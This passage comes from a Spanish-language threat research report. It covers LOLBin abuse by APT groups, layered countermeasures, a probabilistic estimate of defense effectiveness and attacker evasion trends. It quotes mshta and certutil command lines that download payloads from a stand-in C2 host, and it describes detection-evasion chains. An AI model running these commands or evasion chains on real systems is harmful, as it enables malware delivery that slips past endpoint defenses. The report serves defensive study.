| SideWinder | APT surasiático | 2022 | `mshta.exe http://c2/payload.hta` |
| Kimsuky | APT norcoreano | 2022-2023 | `mshta.exe vbscript:Execute("...")` |

**certutil.exe:**
| Campaña | Actor | Período | Uso |
|---|---|---|---|
| APT33 | Elfin | 2019-2021 | `certutil -urlcache -split -f http://c2/payload.exe %temp%\p.exe` |
| APT41 | Winnti | 2020 | `certutil -decode encoded.txt payload.dll` |
| Diversos ransomware | Múltiples | 2020-2024 | Descarga + decodificación de payloads |

### 10.3 Análisis de Preferencias de LOLBin por Actor

```
═══════════════════════════════════════════════════════════════
     MAPA DE PREFERENCIAS LOLBIN POR GRUPO APT
═══════════════════════════════════════════════════════════════

  Actor        cmd  ps   rundll mshta certutil  wm   regsvr
  ─────        ───  ──   ────── ───── ────────  ──   ──────
  Emotet        ██  ██   ██                    ██
  IcedID        ██       ██
  QakBot        ██  ██   ██
  BazarLoader   ██       ██
  FIN7                 ██       ██
  APT29                ██              ██
  APT33                ██              ██
  APT41                ██       ██     ██
  Magniber            ██
  Cobalt Strike       ██   ██   ██     ██        ██   ██
  Kimsuky       ██             ██
  SideWinder    ██             ██

  ██ = Usado en campañas documentadas

═══════════════════════════════════════════════════════════════
```

---

## 11. Contramedidas por Capa y Análisis de Efectividad

### 11.1 Modelo de Defensa en Profundidad

```
┌─────────────────────────────────────────────────────────────────┐
│          CONTRAMEDIDAS CONTRA LOLBins + LNK STOMPING           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  CAPA 5: RESTRICCIÓN DE EJECUCIÓN                              │
│  ├── Windows Defender Application Control (WDAC)               │
│  │   → Allow-listing de binarios que pueden ejecutar scripts   │
│  │   → Bloquea cmd.exe desde contexto Explorer                 │
│  ├── AppLocker                                                  │
│  │   → Reglas de Publisher para LOLBins                        │
│  │   → Bloqueo de ejecución desde %TEMP%, %APPDATA%            │
│  └── Constrained Language Mode (PowerShell)                     │
│      → Restringe acceso a .NET y COM                           │
│      → Bloquea IEX, Invoke-WebRequest, Add-Type                │
│                                                                 │
│  CAPA 4: ENDPOINT DETECTION & RESPONSE (EDR)                   │
│  ├── Detección de cadenas LOLBin (parent-child relationships)  │
│  ├── Análisis de CommandLine con ML/heurísticas                │
│  ├── Detección de LNK Stomping (contradicción de flags)        │
│  ├── Detección de ETW patching                                 │
│  └── Stack walking para detectar ejecución inyectada           │
│                                                                 │
│  CAPA 3: AMSI (Antimalware Scan Interface)                     │
│  ├── Escaneo de scripts en PowerShell/VBScript                 │
│  ├── Escaneo de ensamblados .NET                               │
│  └── Integración con motor AV para detección de patrones       │
│                                                                 │
│  CAPA 2: POLÍTICAS DE SEGURIDAD                                │
│  ├── GPO: Mostrar extensiones de archivo                       │
│  ├── GPO: Restringir ejecución desde medios removibles         │
│  ├── Bloqueo de descarga de archivos .lnk                      │
│  ├── ASR (Attack Surface Reduction) rules:                     │
│  │   → "Block Office applications from creating child processes"│
│  │   → "Block executable content from email client"            │
│  │   → "Block process creations originating from PSExec and WMI"│
│  └── Script Block Logging (PowerShell)                          │
│                                                                 │
│  CAPA 1: GATEWAY / CORREO                                      │
│  ├── Sandboxing de archivos adjuntos (.iso, .zip, .lnk)       │
│  ├── Análisis estático de estructura LNK                       │
│  ├── Detección de LNK con Target ≠ IconApp                    │
│  └── Bloqueo de .lnk en adjuntos de correo                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 11.2 Efectividad por Capa contra el Vector

| Capa | Efectividad | Limitaciones |
|---|---|---|
| WDAC (allow-listing estricto) | **Máxima** — bloquea toda cadena no autorizada | Requiere mantenimiento activo; puede romper flujos legítimos |
| AppLocker (LOLBin rules) | **Alta** — bloquea ejecución de LOLBins desde contextos no esperados | Configuración compleja; FP posibles |
| Constrained Language Mode | **Alta contra PowerShell** — bloquea acceso a cmdlets peligrosos | No afecta a rundll32, mshta, certutil |
| EDR avanzado | **Alta** — detección de cadenas anómalas y stomping | Dependiente de cobertura de reglas; ventana de latencia |
| AMSI | **Media** — detecta scripts maliciosos conocidos | Evadible con patching; no cubre código nativo |
| ASR rules | **Media-Alta** — reduce superficie de ataque | Reglas específicas; no cubren todas las variantes |
| Script Block Logging | **Media** — registro completo de scripts ejecutados | Solo post-mortem; no previene ejecución |
| Gateway sandbox | **Alta** — detonación antes de entrega | Latencia; payloads cifrados pueden evadir |

### 11.3 Análisis Probabilístico de Defensa

$$P(\text{Éxito del vector}) = \prod_{i=1}^{n} (1 - p_i)$$

| Defensa | $p_i$ (empresa promedio) | $p_i$ (entorno endurecido) |
|---|---|---|
| EDR con reglas LOLBin | 0.50 | 0.90 |
| AppLocker/WDAC | 0.25 | 0.85 |
| AMSI (PowerShell chains) | 0.40 | 0.70 |
| ASR rules | 0.20 | 0.80 |
| Constrained Language Mode | 0.15 | 0.80 |
| Gateway sandbox | 0.20 | 0.80 |
| Extensiones visibles (GPO) | 0.15 | 0.90 |

**Empresa promedio:**

$$P(\text{Éxito}) \approx 0.50 \times 0.75 \times 0.60 \times 0.80 \times 0.85 \times 0.80 \times 0.85 \approx 0.104 \quad (\approx 10.4\%)$$

**Entorno endurecido:**

$$P(\text{Éxito}) \approx 0.10 \times 0.15 \times 0.30 \times 0.20 \times 0.20 \times 0.20 \times 0.10 \approx 0.0000036 \quad (\approx 0.00036\%)$$

---

## 12. Mutaciones y Evolución Post-Detección

### 12.1 Tendencias de Mutación Observadas

**Mutación 1 — Diversificación de cadenas:**

Los actores han migrado de cadenas simples (`cmd.exe → powershell.exe`) a cadenas múltiples y polimórficas:

```
Cadena v1 (2021): cmd.exe → powershell.exe → payload
Cadena v2 (2022): cmd.exe → powershell.exe → certutil → powershell.exe → payload
Cadena v3 (2023): cmd.exe → forfiles.exe → powershell.exe → payload
Cadena v4 (2024): cmd.exe → pcalua.exe → rundll32.exe → DLL
```

**Mutación 2 — Evasión de detección de cadenas:**

Para evadir la detección basada en parent-child relationships:

```
Técnica: Proceso intermedio "limpio"
explorer.exe → cmd.exe → svchost.exe (legítimo, vía WMI)
                        → svchost.exe → powershell.exe

La detección de "explorer.exe → powershell.exe" no se activa
porque hay un proceso intermedio que rompe la cadena directa.
```

**Mutación 3 — Desacoplamiento de la descarga y ejecución:**

```
Fase 1 (LNK): certutil descarga payload.dll → %TEMP%
Fase 2 (Tiempo después): Segundo LNK o scheduled task ejecuta
rundll32.exe %TEMP%\payload.dll

La separación temporal evita la correlación en una misma ventana.
```

**Mutación 4 — Abandono de PowerShell:**

Ante la mejora de detección de PowerShell, algunos actores han migrado completamente a alternativas:

```
LNK → cmd.exe /c start msedge.exe --disable-gpu --no-sandbox file:///C:/temp/evil.html
      → Edge ejecuta JavaScript que realiza la carga del payload
      → Edge no es monitoreado como LOLBin tradicional
```

### 12.2 Carrera Armamentista: Detección vs. Evasión

```
═══════════════════════════════════════════════════════════════
         CARRERA ARMAMENTISTA: LOLBins + DETECCIÓN
═══════════════════════════════════════════════════════════════

  2018: Atacantes usan cmd.exe → powershell.exe
        │
        ▼
  2019: Defensores detectan parent-child cmd→ps
        │
        ▼
  2020: Atacantes añaden AMSI bypass + obfuscation
        │
        ▼
  2021: Defensores mejoran AMSI + Script Block Logging
        │
        ▼
  2021: Atacantes añaden ISO container + LNK stomping
        │
        ▼
  2022: Defensores parchean MotW en ISO + detección de stomping
        │
        ▼
  2022: Atacantes migran a .img, VHDX, cadenas polimórficas
        │
        ▼
  2023: Defensores amplían detección a múltiples contenedores
        │
        ▼
  2023: Atacantes usan ejecución nativa C++, evitan PowerShell
        │
        ▼
  2024: Defensores implementan detección de ETW patching + 
        stack walking avanzado
        │
        ▼
  2024: Atacantes usan kernel callbacks evasion + 
        direct syscalls desde ASM
        │
        ▼
  ... (carrera continúa)

═══════════════════════════════════════════════════════════════
```

---

## 13. Referencias y Marco Normativo

### Especificaciones de Formatos

- Microsoft (2024). *[MS-SHLLINK]: Shell Link Binary File Format.* Microsoft Open Specifications.
- Microsoft (2024). *[MS-SHLLINK2]: Additional Shell Link Extensions.* Microsoft Open Specifications.
- LOLBAS Project. *Living Off The Land Binaries, Scripts and Libraries.* https://lolbas-project.github.io/

### Sistemas Operativos y Kernel NT

- Russinovich, M., Solomon, D., & Ionescu, A. (2021). *Windows Internals*, 7th Edition. Microsoft Press.
- Microsoft (2024). *Windows Management Instrumentation Documentation.* Microsoft Learn.
- DMTF (2023). *Common Information Model (CIM) Infrastructure Specification*, DSP0004.

### Teoría de Concurrencia y Autómatas

- Hoare, C.A.R. (1985). *Communicating Sequential Processes.* Prentice Hall.
- Henzinger, T.A. (1996). *The Theory of Hybrid Automata.* Proceedings of LICS'96.
- Schneider, S. (1999). *Concurrent and Real-Time Systems: The CSP Approach.* Wiley.

### Análisis de Campañas APT

- Proofpoint (2021). *"Cybercrime and the Mark-of-the-Web."*
- SentinelOne (2022). *"The ISO Dilemma."*
- Elastic Security Labs (2023). *"Container-Based Evasion: Taxonomy and Detection."*
- Mandiant (2022). *"APT29 and Novel Delivery Mechanisms."*
- Trend Micro (2022). *"Magniber Ransomware Shifts to ISO Distribution."*
- Recorded Future (2023). *"LOLBin Evolution: From Convenience to Evasion."*

### AMSI y Detección

- Microsoft (2024). *Antimalware Scan Interface (AMSI) Reference.* Microsoft Learn.
- Tal, L. (2019). *"AMSI Bypass: A Review of Techniques."* Black Hat Europe.
- Bohannon, D. (2018). *"Invoke-Obfuscation: PowerShell Obfuscation."* DerbyCon.

### MITRE ATT&CK

- MITRE ATT&CK (2024). *T1218: System Binary Proxy Execution.*
- MITRE ATT&CK (2024). *T1218.001: Compiled HTML File.*
- MITRE ATT&CK (2024). *T1218.002: Control Panel.*
- MITRE ATT&CK (2024). *T1218.005: Mshta.*
- MITRE ATT&CK (2024). *T1218.011: Rundll32.*
- MITRE ATT&CK (2024). *T1059.001: PowerShell.*
- MITRE ATT&CK (2024). *T1059.003: Windows Command Shell.*
- MITRE ATT&CK (2024). *T1553.005: Mark-of-the-Web Bypass.*

### Teoría de la Información

- Shannon, C.E. (1948). *"A Mathematical Theory of Communication."* Bell System Technical Journal.
- Cover, T.M. & Thomas, J.A. (2006). *Elements of Information Theory*, 2nd Edition. Wiley.

### Semiótica y Cognición

- Peirce, C.S. (1931-1958). *Collected Papers.* Harvard University Press.
- Kahneman, D. (2011). *Thinking, Fast and Slow.* Farrar, Straus and Giroux.

---

*Documento de investigación técnica sobre los mecanismos de ejecución vía LOLBins, manipulación de formato Shell Link, y el sistema de detección basado en el motor de eventos WQL. El análisis se limita a la descripción objetiva del fenómeno desde la perspectiva de la ciencia computacional, la teoría de autómatas, la teoría de la información y los modelos formales de seguridad, con el propósito de fundamentar mecanismos de detección y defensa.*
